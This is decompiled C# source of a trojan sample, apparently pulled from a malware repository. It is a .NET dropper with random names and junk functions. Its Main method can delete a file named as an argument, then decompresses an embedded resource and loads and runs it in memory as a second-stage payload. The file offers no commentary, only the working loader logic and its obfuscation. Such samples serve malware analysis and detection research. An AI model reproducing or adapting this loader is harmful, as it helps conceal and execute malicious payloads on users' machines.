// Decompiled with JetBrains decompiler
// Type: mDHrnWAXHl
// Assembly: tmp6B4F.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BB739F82-2EC8-4017-A670-EFFE81236079
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-7496e6b832f4eacd57941e8e1432076a71dd008f9e38c79ca6dfffe92e573272.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

[StandardModule]
public sealed class mDHrnWAXHl
{
  public static string qPVcc00(string BylXg0, string ZkPpA0, string CHiJd0)
  {
    string[] strArray1 = new string[5]
    {
      "qPVcc0",
      nameof (BylXg0),
      nameof (ZkPpA0),
      nameof (CHiJd0),
      "Vifpx0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], BylXg0, false) != 0)
    {
      ZkPpA0 = CHiJd0 + BylXg0;
      if (CHiJd0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (CHiJd0.Length - 1));
        while (ZkPpA0.Length == 2)
        {
          if (BylXg0.Contains(strArray1[1]))
            return BylXg0;
        }
      }
    }
    return BylXg0;
  }

  public static string KDhkN11(string tbUxq1, string VVXMS1, string KNhJH1)
  {
    string[] strArray1 = new string[5]
    {
      "KDhkN1",
      nameof (tbUxq1),
      nameof (VVXMS1),
      nameof (KNhJH1),
      "yCNJg1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], tbUxq1, false) != 0)
    {
      VVXMS1 = KNhJH1 + tbUxq1;
      if (KNhJH1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (KNhJH1.Length - 1));
        while (VVXMS1.Length == 2)
        {
          if (tbUxq1.Contains(strArray1[1]))
            return tbUxq1;
        }
      }
    }
    return tbUxq1;
  }

  [STAThread]
  public static void Main(string[] args)
  {
    if (args.Length <= 0)
    {
      qFfABsLpVq.XhGIRGyxJR();
    }
    else
    {
      try
      {
        File.Delete(args[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    Assembly.Load(mDHrnWAXHl.Deflate_D((byte[]) new ResourceManager("zCom", Assembly.GetExecutingAssembly()).GetObject("file"))).EntryPoint.Invoke((object) null, (object[]) null);
  }

  public static byte[] Deflate_D(byte[] DataZ)
  {
    byte[] numArray;
    try
    {
      numArray = mDHrnWAXHl.getStreamBytesX((Stream) new DeflateStream((Stream) new MemoryStream(DataZ), CompressionMode.Decompress, true), DataZ.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] getStreamBytesX(Stream dataStr, int dataChunks)
  {
    int offset = 0;
    byte[] streamBytesX;
    try
    {
      byte[] numArray;
      while (true)
      {
        numArray = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset + dataChunks + 1)]);
        int num = dataStr.Read(numArray, offset, dataChunks);
        if (num != 0)
          checked { offset += num; }
        else
          break;
      }
      streamBytesX = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset - 1 + 1)]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      streamBytesX = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return streamBytesX;
  }

  public static string swLuj00(string MMDDf0, string vPaYp0, string OqsqB0)
  {
    string[] strArray1 = new string[5]
    {
      "swLuj0",
      nameof (MMDDf0),
      nameof (vPaYp0),
      nameof (OqsqB0),
      "KpuTf0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], MMDDf0, false) != 0)
    {
      vPaYp0 = OqsqB0 + MMDDf0;
      if (OqsqB0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (OqsqB0.Length - 1));
        while (vPaYp0.Length == 2)
        {
          if (MMDDf0.Contains(strArray1[1]))
            return MMDDf0;
        }
      }
    }
    return MMDDf0;
  }

  public static string rnWAi11(string GkOgx1, string GVSjd1, string dsjwX1)
  {
    string[] strArray1 = new string[5]
    {
      "rnWAi1",
      nameof (GkOgx1),
      nameof (GVSjd1),
      nameof (dsjwX1),
      "wUuLo1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], GkOgx1, false) != 0)
    {
      GVSjd1 = dsjwX1 + GkOgx1;
      if (dsjwX1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (dsjwX1.Length - 1));
        while (GVSjd1.Length == 2)
        {
          if (GkOgx1.Contains(strArray1[1]))
            return GkOgx1;
        }
      }
    }
    return GkOgx1;
  }
}
